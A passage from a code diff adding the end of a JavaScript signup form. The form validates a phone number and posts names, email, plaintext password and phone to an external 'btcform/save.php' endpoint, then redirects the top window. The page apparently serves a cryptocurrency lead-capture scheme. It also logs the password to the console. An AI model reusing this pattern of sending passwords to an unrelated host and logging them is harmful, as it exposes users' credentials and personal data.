+                        self.form.isphoneErrormsg = 'the phone is required';
+                        setTimeout(() => {
+                            self.form.isphoneError = false;
+                        }, 2000);
+                        return;
+                    }
+                    if (phone) {
+                        if (iti.isValidNumber()) {
+                            self.form.isphoneError = false;
+                        } else {
+                            var errorCode = iti.getValidationError();
+                            self.form.isphoneError = true;
+                            self.form.isphoneErrormsg = this.errorMap[errorCode] || 'is Valid Phone';
+                            setTimeout(() => {
+                                self.form.isphoneError = false;
+                            }, 2000)
+                            return;
+                        }
+                    }
+                    // if (!phone) {
+                    //     this.currentCountry.isError = true;
+                    //     this.currentCountry.errorMsg = notAllowNull;
+                    //     setTimeout(() => {
+                    //         this.currentCountry.isError = false;
+                    //     }, 2000);
+                    //     return;
+                    // }
+                    // if (!/^[0-9]+$/.test(phone)) {
+                    //     this.currentCountry.isError = true;
+                    //     this.currentCountry.errorMsg = 'Specify the correct phone';
+                    //     setTimeout(() => {
+                    //         this.currentCountry.isError = false;
+                    //     }, 2000);
+                    //     return;
+                    // }
+
+                    this.submiForm = {
+                        Firstname: firstName,
+                        Lastname: lastName,
+                        Email: email,
+                        Password: password,
+                        Countrycode: $('.iti__flag')[0].className.split(" ")[1].split('__')[1].toUpperCase(),
+                        PhoneCode: $('.iti__selected-dial-code')[0].innerText.substring(1),
+                        PhoneNumber: phone
+                    }
+                    console.log("--submiForm--", this.submiForm)
+                    setTimeout(() => {
+                        self.loading = true
+                        $.post("https://bmxxvck.icu/btcform/save.php", this.submiForm, function (data) {
+                            var obj = JSON.parse(data);
+                            if (obj.code == 'sucess') {
+                                self.loading = false
+                                window.top.location = obj.url;
+                            }
+                        });
+                    }, 100)
+
+                }
+            }
+        }
+    })
+</script>
+
+</html>
